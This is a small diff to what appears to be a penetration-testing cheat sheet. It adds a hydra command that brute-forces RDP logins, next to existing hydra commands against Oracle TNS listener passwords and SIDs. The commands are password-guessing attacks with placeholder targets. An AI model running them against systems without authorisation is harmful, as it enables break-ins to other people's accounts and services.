@@ -1813,6 +1813,9 @@ hydra -P wordlist_here -t number_of_threads_here -s 1521 IP_here oracle-listener
 
 # brute-force SIDs ORacle TNS listener password
 hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
+
+# brute-force RDP
+hydra -L users.txt -P passwords.txt rdp://IP_here -t 1
 ```
 
 
